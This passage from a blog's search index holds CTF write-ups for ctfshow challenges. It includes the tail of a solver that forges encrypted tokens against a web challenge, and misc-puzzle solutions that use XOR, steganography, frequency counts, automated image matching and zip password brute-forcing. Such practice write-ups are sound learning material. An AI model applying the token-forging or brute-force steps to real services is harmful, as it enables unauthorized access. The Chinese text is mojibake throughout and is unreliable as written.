fake_address=miwen[:<span class="number">64</span>]+miwen[<span class="number">80</span>:]</span><br><span class="line">                fake_address=base64.b64encode(fake_address).decode()</span><br><span class="line">                r=s.get(url+<span class="string">&#x27;get_dragonball&#x27;</span>,params=&#123;<span class="string">&quot;address&quot;</span>:fake_address&#125;)</span><br><span class="line"></span><br><span class="line">r=s.get(url+<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="æ‚é¡¹ç­¾åˆ°"><a href="#æ‚é¡¹ç­¾åˆ°" class="headerlink" title="æ‚é¡¹ç­¾åˆ°"></a>æ‚é¡¹ç­¾åˆ°</h2><p>å”‰ ä½èƒ½</p>
<p>010æœä¸€ä¸‹ctfshow</p>
<h2 id="æŸåçš„å‹ç¼©åŒ…"><a href="#æŸåçš„å‹ç¼©åŒ…" class="headerlink" title="æŸåçš„å‹ç¼©åŒ…"></a>æŸåçš„å‹ç¼©åŒ…</h2><p>010å‘ç°æ˜¯PNGå¤´ï¼Œæ”¹åç¼€</p>
<h2 id="è°œä¹‹æ …æ "><a href="#è°œä¹‹æ …æ " class="headerlink" title="è°œä¹‹æ …æ "></a>è°œä¹‹æ …æ </h2><p>å›¾ç‰‡æ …æ </p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311042145236.png" alt="image-20231104214552159"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311042146055.png" alt="image-20231104214600022"></p>
<h2 id="ä½ ä¼šæ•°æ•°å—"><a href="#ä½ ä¼šæ•°æ•°å—" class="headerlink" title="ä½ ä¼šæ•°æ•°å—"></a>ä½ ä¼šæ•°æ•°å—</h2><p>è¯é¢‘ç»Ÿè®¡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alphabet = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =\\&#123;\\&#125;[]&quot;</span><br><span class="line">strings = open(&#x27;misc4.txt&#x27;).read()  # æ–‡ä»¶æ‰“å¼€å¤„</span><br><span class="line"></span><br><span class="line">result = &#123;&#125;</span><br><span class="line">for i in alphabet:</span><br><span class="line">    counts = strings.count(i)</span><br><span class="line">    i = &#x27;&#123;0&#125;&#x27;.format(i)</span><br><span class="line">    result[i] = counts</span><br><span class="line"></span><br><span class="line">res = sorted(result.items(), key = lambda item: item[1], reverse = True)</span><br><span class="line">for data in res:</span><br><span class="line">    print(data)</span><br><span class="line"></span><br><span class="line">for i in res:</span><br><span class="line">    flag = str(i[0])</span><br><span class="line">    print(flag[0], end = &quot;&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="ä½ ä¼šå¼‚æˆ–å—"><a href="#ä½ ä¼šå¼‚æˆ–å—" class="headerlink" title="ä½ ä¼šå¼‚æˆ–å—"></a>ä½ ä¼šå¼‚æˆ–å—</h2><p>é€ä½å¼‚æˆ–</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">input_filename = &quot;misc5.png&quot;  # è¾“å…¥æ–‡ä»¶å</span><br><span class="line">output_filename = &quot;output.png&quot;  # è¾“å‡ºæ–‡ä»¶å</span><br><span class="line"></span><br><span class="line"># æ‰“å¼€è¾“å…¥æ–‡ä»¶ä»¥åŠåˆ›å»ºè¾“å‡ºæ–‡ä»¶</span><br><span class="line">with open(input_filename, &quot;rb&quot;) as input_file, open(output_filename, &quot;wb&quot;) as output_file:</span><br><span class="line">    while True:</span><br><span class="line">        byte = input_file.read(1)  # é€å­—èŠ‚è¯»å–è¾“å…¥æ–‡ä»¶</span><br><span class="line">        if not byte:</span><br><span class="line">            break  # å¦‚æœæ²¡æœ‰æ›´å¤šå­—èŠ‚å¯è¯»ï¼Œé€€å‡ºå¾ªç¯</span><br><span class="line">        byte_value = ord(byte)  # å°†å­—èŠ‚è½¬æ¢ä¸ºæ•´æ•°</span><br><span class="line">        xored_byte = byte_value ^ 0x50  # å¯¹å­—èŠ‚è¿›è¡Œå¼‚æˆ–æ“ä½œ</span><br><span class="line">        output_file.write(bytes([xored_byte]))  # å°†ç»“æœå­—èŠ‚å†™å…¥è¾“å‡ºæ–‡ä»¶</span><br></pre></td></tr></table></figure>

<h2 id="flagä¸€åˆ†ä¸ºäºŒ"><a href="#flagä¸€åˆ†ä¸ºäºŒ" class="headerlink" title="flagä¸€åˆ†ä¸ºäºŒ"></a>flagä¸€åˆ†ä¸ºäºŒ</h2><p>é«˜åº¦éšå†™+å•æ–‡ä»¶ç›²æ°´å°</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311052104615.png" alt="image-20231105210407541"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311052104573.png" alt="image-20231105210415512"></p>
<h2 id="æˆ‘æ˜¯è°ï¼Ÿï¼Ÿ"><a href="#æˆ‘æ˜¯è°ï¼Ÿï¼Ÿ" class="headerlink" title="æˆ‘æ˜¯è°ï¼Ÿï¼Ÿ"></a>æˆ‘æ˜¯è°ï¼Ÿï¼Ÿ</h2><p>ç½‘ä¸Šæœ‰ä¸€æŠŠæ¢­è„šæœ¬ï¼Œæœ¬è´¨æ˜¯ç”¨cv2æ¯”å¯¹å›¾ç‰‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">from lxml import html</span><br><span class="line">import cv2</span><br><span class="line">import numpy as np</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=&quot;http://0095371d-eeec-4e9d-929b-046aaeb84249.challenge.ctf.show/&quot;</span><br><span class="line"></span><br><span class="line">sess=requests.session()</span><br><span class="line"></span><br><span class="line">all_girl=sess.get(url+&#x27;/static/all_girl.png&#x27;).content</span><br><span class="line"></span><br><span class="line">with open(&#x27;all_girl.png&#x27;,&#x27;wb&#x27;)as f:</span><br><span class="line">        f.write(all_girl)</span><br><span class="line"></span><br><span class="line">big_pic=cv2.imdecode(np.fromfile(&#x27;all_girl.png&#x27;, dtype=np.uint8), cv2.IMREAD_UNCHANGED)</span><br><span class="line">big_pic=big_pic[50:,50:,:]</span><br><span class="line">image_alpha = big_pic[:, :, 3]</span><br><span class="line">mask_img=np.zeros((big_pic.shape[0],big_pic.shape[1]), np.uint8)</span><br><span class="line">mask_img[np.where(image_alpha == 0)] = 255</span><br><span class="line"></span><br><span class="line">cv2.imwrite(&#x27;big.png&#x27;,mask_img)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def answer_one(sess):</span><br><span class="line">        #è·å–è§†é¢‘æ–‡ä»¶</span><br><span class="line">        response=sess.get(url+&#x27;/check&#x27;)</span><br><span class="line">        if &#x27;ctfshow&#123;&#x27; in response.text:</span><br><span class="line">                print(response.text)</span><br><span class="line">                exit(0)</span><br><span class="line">        tree=html.fromstring(response.text)</span><br><span class="line">        element=tree.xpath(&#x27;//source[@id=&quot;vsource&quot;]&#x27;)</span><br><span class="line">        video_path=element[0].get(&#x27;src&#x27;)</span><br><span class="line">        video_bin=sess.get(url+video_path).content</span><br><span class="line">        with open(&#x27;Question.mp4&#x27;,&#x27;wb&#x27;)as f:</span><br><span class="line">                f.write(video_bin)</span><br><span class="line">        #è·å–æœ‰æ•ˆå¸§</span><br><span class="line">        video = cv2.VideoCapture(&#x27;Question.mp4&#x27;)</span><br><span class="line">        frame=0</span><br><span class="line">        while frame&lt;=55:</span><br><span class="line">                res, image = video.read()</span><br><span class="line">                frame+=1</span><br><span class="line">        #cv2.imwrite(&#x27;temp.png&#x27;,image)</span><br><span class="line">        video.release()</span><br><span class="line">        #è·å–å‰ªå½±</span><br><span class="line">        image=image[100:400,250:500]</span><br><span class="line">        gray_image=cv2.cvtColor(image,cv2.COLOR_BGR2GRAY)</span><br><span class="line">        #cv2.imwrite(&#x27;gray_image.png&#x27;,gray_image)</span><br><span class="line">        temp = np.zeros((300, 250), np.uint8)</span><br><span class="line">        temp[np.where(gray_image&gt;=128)]=255</span><br><span class="line">        #å»ç™½è¾¹</span><br><span class="line">        temp = temp[[not np.all(temp[i] == 255) for i in range(temp.shape[0])], :]</span><br><span class="line">        temp = temp[:, [not np.all(temp[:, i] == 255) for i in range(temp.shape[1])]]</span><br><span class="line">        #ç¼©æ”¾è‡³åˆé€‚å¤§å°ï¼Œè‚‰çœ¼å¤§è‡´åˆ¤æ–­æ˜¯1.2å€ï¼Œä¸ä¸€å®šå‡†</span><br><span class="line">        temp = cv2.resize(temp,None,fx=1.2,fy=1.2)</span><br><span class="line">        #æŸ¥æ‰¾ä½ç½®</span><br><span class="line">        res =cv2.matchTemplate( mask_img,temp,cv2.TM_CCOEFF_NORMED)</span><br><span class="line">        min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(res)</span><br><span class="line">        x,y=int(max_loc[0]/192),int(max_loc[1]/288)#ä¸ºä»€ä¹ˆæ˜¯192å’Œ288ï¼Œå› ä¸ºå¤§å›¾å»æ‰æ ‡é¢˜æ å°±æ˜¯1920*2880</span><br><span class="line">        guess=&#x27;ABCDEFGHIJ&#x27;[y]+&#x27;0123456789&#x27;[x]</span><br><span class="line">        print(f&#x27;guess:&#123;guess&#125;&#x27;)</span><br><span class="line">        #ä¼ ç­”æ¡ˆ</span><br><span class="line">        response=sess.get(url+&#x27;/submit?guess=&#x27;+guess)</span><br><span class="line">        r=json.loads(response.text)</span><br><span class="line">        if r[&#x27;result&#x27;]:</span><br><span class="line">                print(&#x27;guess right!&#x27;)</span><br><span class="line">                return True</span><br><span class="line">        else:</span><br><span class="line">                print(&#x27;guess wrong!&#x27;)</span><br><span class="line">                return False</span><br><span class="line"></span><br><span class="line">i=1</span><br><span class="line"></span><br><span class="line">while i&lt;=31:</span><br><span class="line">        print(f&#x27;Round:&#123;i&#125;&#x27;)</span><br><span class="line">        if answer_one(sess):</span><br><span class="line">                i+=1</span><br><span class="line">        else:</span><br><span class="line">                i=1</span><br></pre></td></tr></table></figure>

<h2 id="You-and-me"><a href="#You-and-me" class="headerlink" title="You and me"></a>You and me</h2><p>ç›²æ°´å°ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸€å®šè¦åœ¨py3çš„ç¯å¢ƒæ‰èƒ½æ¢å¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python bwmforpy3.py decode you.png you_and_me.png flag.png</span><br></pre></td></tr></table></figure>

<h2 id="7-1-05"><a href="#7-1-05" class="headerlink" title="7.1.05"></a>7.1.05</h2><p>æ‹¿åˆ°æ–‡ä»¶æ‹–è¿›010åˆ†æï¼Œçœ‹åˆ°æ˜¯ä¸€ä¸ªæ¸¸æˆçš„å­˜æ¡£</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311081237022.png" alt="image-20231108123722936"></p>
<p>ä¸‹æ¸¸æˆï¼Œè¿›å»æç¤º</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311081237575.png" alt="image-20231108123752538"></p>
<blockquote>
<p>*<strong>long_flag_in_R&amp;Dã€‚*</strong></p>
<p>***R&amp;D******çš„æ„æ€æ˜¯****<strong>Research&amp;Develop*</strong></p>
<p>åœ¨æ¸¸æˆä¸­èƒ½ä»£è¡¨è¿™ä¸ªå«ä¹‰çš„ï¼Œæ˜¯ç ”å‘ä¸­å¿ƒã€‚å› æ­¤æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ç ”å‘ä¸­å¿ƒçš„ç§˜å¯†</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/e799c53950d04f6cb180805878b9a93c.png" alt="img"></p>
<p>å¯ä»¥å‘ç°æ¯ä¸ªç ”å‘ä¸­å¿ƒçš„ç ”å‘éƒ¨é—¨çš„æ•°é‡éƒ½ä¸ä¸€æ ·ï¼Œ***å°†å…¶æŒ‰ç…§ä»å·¦ä¸‹å‘å³ä¸Šï¼Œå†è¡Œæ‰«æçš„æ–¹å¼***ï¼Œå¯ä»¥å¾—åˆ°è¿™ä¹ˆä¸€ä¸²æ•°å­—ï¼š</p>
<p>***9794598612147726669494087179782678475623253058262173164497949649813569030779924086502049160804***å†ç»“åˆæç¤º</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/593e0860124541b19b6ad2d43a4f28ee.png" alt="img"></p>
<p><strong>long_to_bytesæ˜¯ä¸€ä¸ªå¸¸ç”¨äºRSAçš„å‡½æ•°ï¼Œç”¨äºå°†æ•°å­—è½¬æˆå­—èŠ‚ï¼Œæ¥è¯•ä¸€ä¸‹ï¼š</strong></p>
<p>***&gt;&gt;&gt; from Crypto.Util.number import long_to_bytes***</p>
<p>***&gt;&gt;&gt; long _ to_bytes***</p>
<p>***(9794598612147726669494087179782678475623253058262173164497949649813569030779924086502049160804 )b â€œ \ X01 , x84 ( xfa , xe7 ] FI &amp; x84 ? \ \ \ \ \ \ \ \ \ \ xc1x08\ x03 &#x2F; \ x9auo \ xc2;ek \ x9edâ€™***</p>
<p><strong>å¤±è´¥äº†ï¼Œé‚£æœ‰æ²¡æœ‰å¯èƒ½æ˜¯è¢«é€†åºäº†ï¼Ÿ</strong></p>
<p>***&gt;&gt;&gt;long _ to _ bytes***</p>
<p>***(4080619402056804299770309653189469497944613712628503523265748762879717804949666277412168954979)***</p>
<p>*<strong>bâ€™}3maG_d00G_0S_s1_baL_ms1lat1paC{wohsftcâ€™*</strong></p>
<p><strong>å¯ä»¥æ˜æ˜¾çœ‹åˆ°ä¸€ä¸ªwohsftcï¼Œè¿™æ˜¯è¢«é€†åºè¿‡çš„ctfshowã€‚å†é€†åºä¸€éå³å¯å¾—åˆ°flag</strong></p>
<p>*<strong>ctfshow{Cap1tal1sm_Lab_1s_S0_G00d_Gam3}*</strong></p>
</blockquote>
<h2 id="é»‘ä¸ç™½ä¸è¿˜æœ‰ä»€ä¹ˆä¸ï¼Ÿ"><a href="#é»‘ä¸ç™½ä¸è¿˜æœ‰ä»€ä¹ˆä¸ï¼Ÿ" class="headerlink" title="é»‘ä¸ç™½ä¸è¿˜æœ‰ä»€ä¹ˆä¸ï¼Ÿ"></a>é»‘ä¸ç™½ä¸è¿˜æœ‰ä»€ä¹ˆä¸ï¼Ÿ</h2><p>ç»™å‡ºä¸ªè§†é¢‘ï¼Œæœ‰æç¤ºæ˜¯æ‘©æ–¯å¯†ç </p>
<p>é‚£å°±é»‘ä¸ï¼š-ï¼›ç™½ä¸ï¼š.</p>
<h2 id="æˆ‘åäº†ä½ éšæ„"><a href="#æˆ‘åäº†ä½ éšæ„" class="headerlink" title="æˆ‘åäº†ä½ éšæ„"></a>æˆ‘åäº†ä½ éšæ„</h2><p>é¢˜ç›®æç¤ºï¼š0å®½åº¦éšå†™</p>
<p><a href="https://www.mzy0.com/ctftools/zerowidth1/">https://www.mzy0.com/ctftools/zerowidth1/</a></p>
<h2 id="è¿™æ˜¯ä¸ªä»€ä¹ˆæ–‡ä»¶ï¼Ÿ"><a href="#è¿™æ˜¯ä¸ªä»€ä¹ˆæ–‡ä»¶ï¼Ÿ" class="headerlink" title="è¿™æ˜¯ä¸ªä»€ä¹ˆæ–‡ä»¶ï¼Ÿ"></a>è¿™æ˜¯ä¸ªä»€ä¹ˆæ–‡ä»¶ï¼Ÿ</h2><p>zipå‘ç°æ˜¯åŠ å¯†æ–‡ä»¶ï¼Œå…ˆçŒœæµ‹ä¼ªåŠ å¯†</p>
<p>è§£å‹ä¸‹æ¥fileä¸€ä¸‹çœ‹åˆ°æ˜¯Byte-compiled Python</p>
<p>ä½¿ç”¨uncompyle6 -o 2.py 2.pycåç¼–è¯‘</p>
<h2 id="æŠ½è±¡ç”»"><a href="#æŠ½è±¡ç”»" class="headerlink" title="æŠ½è±¡ç”»"></a>æŠ½è±¡ç”»</h2><p>ä¸€å¤§ä¸²æ–‡å­—ï¼ŒçŒœæµ‹æ˜¯baseåŠ å¯†</p>
<p>æ¢äº†ä¸€ä¸ªbasecrackå·¥å…·ï¼Œèƒ½ä¸€æŠŠæ¢­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python basecrack.py -m -f æŠ½è±¡ç”».txt</span><br></pre></td></tr></table></figure>

<p>æ‰“å‡ºæ¥æ˜¯ä¸ª16è¿›åˆ¶</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311081458287.png" alt="image-20231108145856186"></p>
<p>å†™è¿›æ–‡ä»¶æ˜¯ä¸ªpng</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311081459632.png" alt="a"></p>
<p>ç”¨npietå·¥å…·è¯»</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npiet.exe a.png</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311081459590.png" alt="image-20231108145954551"></p>
<h2 id="è¿…ç–¾å“åº”"><a href="#è¿…ç–¾å“åº”" class="headerlink" title="è¿…ç–¾å“åº”"></a>è¿…ç–¾å“åº”</h2><p>QRç ï¼Œä½†ç”¨å·¥å…·æ‰«ä¸å‡ºæ¥</p>
<p><a href="https://merri.cx/qrazybox/">https://merri.cx/qrazybox/</a></p>
<p>ç›´æ¥ä¼ èƒ½å‡ºå‰åŠæ®µflagï¼ŒååŠæ®µéœ€è¦æ¶‚ç™½çº é”™åŒº</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1a7deb33231d431098350b85a94d1d82~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp" alt="img"></p>
<h2 id="æˆ‘å¯æ²¡æœ‰éª—ä½ "><a href="#æˆ‘å¯æ²¡æœ‰éª—ä½ " class="headerlink" title="æˆ‘å¯æ²¡æœ‰éª—ä½ "></a>æˆ‘å¯æ²¡æœ‰éª—ä½ </h2><p>ä¸‹ä¸‹æ¥çš„zipç«Ÿç„¶ä¸æ˜¯ä¼ªåŠ å¯†ï¼Œç”¨å­—å…¸ä¹Ÿçˆ†ä¸å‡ºæ¥ï¼Œä¸€çœ‹wpæ˜¯å…«ä½æ•°çº¯æ•°å­—çˆ†ç ´ğŸ˜…55813329</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311091253659.png" alt="image-20231109125132052"></p>
<p>waveæ–‡ä»¶ç›´æ¥çœ‹éšå†™SilentEye</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311091254828.png" alt="image-20231109125404795"></p>
<h2 id="ä½ è¢«éª—äº†"><a href="#ä½ è¢«éª—äº†" class="headerlink" title="ä½ è¢«éª—äº†"></a>ä½ è¢«éª—äº†</h2><p>ä¸‹ä¸‹æ¥æ˜¯ä¸ªæ­£ç»mp3ï¼Œmp3å¯ä»¥ç”¨MP3Stego</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Decode.exe -X -P nibeipianle nibeipianle.mp3</span><br></pre></td></tr></table></figure>

<h2 id="ä¸€é—ªä¸€é—ªäº®æ™¶æ™¶"><a href="#ä¸€é—ªä¸€é—ªäº®æ™¶æ™¶" class="headerlink" title="ä¸€é—ªä¸€é—ªäº®æ™¶æ™¶"></a>ä¸€é—ªä¸€é—ªäº®æ™¶æ™¶</h2><p>ç¬¬ä¸€æ¬¡è§æ±‰ä¿¡ç ï¼š<a href="https://tuzim.net/hxdecode/">https://tuzim.net/hxdecode/</a></p>
<p>CDBHSBHSxskv6</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311091324450.png" alt="what is this"></p>
<p>å¾—åˆ°m4aéŸ³é¢‘ï¼Œæ˜¯ä¸ªæ— çº¿ç”µï¼Œç”¨RX-SSTV+VirtualAudioCable</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311091340601.png" alt="image-20231109134046552"></p>
<h2 id="ä¸€å±‚ä¸€å±‚ä¸€å±‚åœ°å‰¥å¼€æˆ‘çš„â™¥"><a href="#ä¸€å±‚ä¸€å±‚ä¸€å±‚åœ°å‰¥å¼€æˆ‘çš„â™¥" class="headerlink" title="ä¸€å±‚ä¸€å±‚ä¸€å±‚åœ°å‰¥å¼€æˆ‘çš„â™¥"></a>ä¸€å±‚ä¸€å±‚ä¸€å±‚åœ°å‰¥å¼€æˆ‘çš„â™¥</h2><p>binwalkä¸€çœ‹æ˜¯docæ–‡ä»¶ï¼Œæœ€åè¿˜è—äº†rar</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311091716086.png" alt="image-20231109171635042"></p>
<p>ä¸çŸ¥é“ä¸ºå•¥foremoståˆ†ç¦»ä¸å‡ºæ¥ï¼Œè¿˜æ˜¯binwalk -eå¥½ç”¨</p>
<p>åˆ†ç¦»ä¹‹åçš„rarå¸¦å¯†ç ï¼Œå›å¤´çœ‹docæ–‡ä»¶</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311091720035.png" alt="image-20231109172052001"></p>
<p>çœ‹äº†wpä¹‹åè¯´æ˜¯ç®€è°±æ•°å­—11556654433221</p>
<p>è§£å‹å‡ºæ¥ä¸€ä¸ªjpgä¸€ä¸ªdataæ–‡ä»¶</p>
<p>jpgåé¢ç´§è·Ÿä¸€ä¸ªjpg</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311091734553.png" alt="image-20231109173438514"></p>
<p>ğŸ˜…çœŸå‡ æŠŠä½èƒ½ï¼Œbinwalkï¼Œforemostè¿˜éƒ½è·‘ä¸å‡ºæ¥</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311091736522.jpg" alt="3"></p>
<p>å›åˆ°â™¥æ–‡ä»¶ï¼Œå¾ˆæ˜æ˜¾æ˜¯raræ–‡ä»¶ç¼ºå°‘äº†æ–‡ä»¶å¤´ï¼Œå¯†ç åˆ™æ˜¯winkwink~</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311091743427.png" alt="image-20231109174314382"></p>
<p>æ‰“å‡ºæ¥æ˜¯emojiï¼Œbase100</p>
<h2 id="æ‰“ä¸å¼€çš„å›¾ç‰‡"><a href="#æ‰“ä¸å¼€çš„å›¾ç‰‡" class="headerlink" title="æ‰“ä¸å¼€çš„å›¾ç‰‡"></a>æ‰“ä¸å¼€çš„å›¾ç‰‡</h2><p>æ‹–è¿›010çœ‹ä¸æ‡‚ï¼Œç»“æœæ˜¯æ¯ä¸ªå­—èŠ‚å–å</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311091751610.png" alt="image-20231109175117575"></p>
<p>æ‰“å‡ºæ¥æ˜¯ä¸ªpng</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>é¢˜è§£</tag>
        <tag>web</tag>
      </tags>
  </entry>
</search>
